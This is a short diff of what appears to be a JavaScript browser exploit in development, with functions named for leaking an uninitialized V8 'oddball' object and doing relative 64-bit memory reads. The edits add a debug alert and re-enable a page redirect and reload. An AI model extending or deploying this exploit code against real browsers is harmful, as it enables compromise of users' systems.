@@ -241,6 +241,7 @@ function UninitializedOddballExploiter(uninitialized_oddball) {
             // alert(hex(hi)+hex(lo));
             // alert(hex(lo));
             if (hi == 2734n || lo == 2734n) {
+                alert("[+]find !");
                 let prev2 = relative_read64(i - 2);
                 let prev1 = relative_read64(i - 1);
 
@@ -644,14 +645,14 @@ function main() {
     var glob_uninitialized_oddball = leak_uninitialized_oddball();
     // %DebugPrint(glob_uninitialized_oddball);
     
-    // if(typeof(glob_uninitialized_oddball) != "undefined"){
-    //     // alert(typeof(glob_uninitialized_oddball));
-    //     location.hred = "test15.html"
-    //     window.location.reload();
-    //     // console.log("1");
-    //     // window.location.reload();
-    // }
-    alert(typeof(glob_uninitialized_oddball));
+    if(typeof(glob_uninitialized_oddball) != "undefined"){
+        // alert(typeof(glob_uninitialized_oddball));
+        location.href = "test19.html"
+        window.location.reload();
+        // console.log("1");
+        // window.location.reload();
+    }
+    // alert(typeof(glob_uninitialized_oddball));
     UninitializedOddballExploiter(glob_uninitialized_oddball);
 }
 
